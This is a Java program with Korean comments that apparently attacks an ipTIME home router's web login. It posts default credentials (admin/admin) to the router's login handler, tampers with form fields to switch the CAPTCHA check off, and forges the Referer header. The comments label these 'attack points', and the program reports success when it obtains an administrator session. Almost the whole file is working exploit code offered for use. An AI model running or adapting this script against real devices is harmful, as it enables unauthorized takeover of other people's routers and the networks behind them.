import java.net.CookieManager;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;

public class RouterLoginTester {
    public static void main(String[] args) throws Exception {
        // 타겟 주소 (1.1 또는 40.1 중 실제 ipTIME이 뜨는 곳으로 설정)
        String targetIp = "192.168.40.1";
        String loginUrl = "http://" + targetIp + "/sess-bin/login_handler.cgi";

        CookieManager cookieManager = new CookieManager();
        HttpClient client = HttpClient.newBuilder()
                .cookieHandler(cookieManager)
                .connectTimeout(Duration.ofSeconds(5))
                .build();

        // [공격 포인트 1] 캡차를 무력화하기 위한 조작된 데이터 구성
        // captcha_on을 0으로 바꾸고, 코드는 대충 넣습니다.
        String formBody = "username=admin" +
                "&passwd=admin" +
                "&init_status=1" +
                "&captcha_on=0" +  // 핵심: 캡차 사용 안 함으로 조작
                "&captcha_file=" + // 핵심: 캡차 파일 경로 비우기
                "&captcha_code=1234";

        HttpRequest loginRequest = HttpRequest.newBuilder()
                .uri(URI.create(loginUrl))
                .header("Content-Type", "application/x-www-form-urlencoded")
                // [공격 포인트 2] 서버가 보낸 로그인 페이지에서 온 것처럼 헤더 위조
                .header("Referer", "http://" + targetIp + "/login/login.php")
                .header("User-Agent", "Mozilla/5.0")
                .POST(HttpRequest.BodyPublishers.ofString(formBody))
                .build();

        System.out.println("[*] 캡차 우회 페이로드 전송 중...");
        HttpResponse<String> response = client.send(loginRequest, HttpResponse.BodyHandlers.ofString());

        System.out.println("[결과 코드]: " + response.statusCode());
        System.out.println("----- [응답 본문 분석] -----");
        String body = response.body();
        System.out.println(body);

        // 분석 로직
        if (body.contains("timepro.cgi") || body.contains("main.cgi")) {
            System.out.println("[!!!] 우회 성공! 관리자 세션을 획득했습니다.");
        } else if (body.contains("captcha") || body.contains("timeout")) {
            System.out.println("[-] 우회 실패: 서버가 캡차 검증을 강제하고 있습니다.");
        } else {
            System.out.println("[?] 알 수 없는 응답: 내용을 수동으로 확인하세요.");
        }
    }
}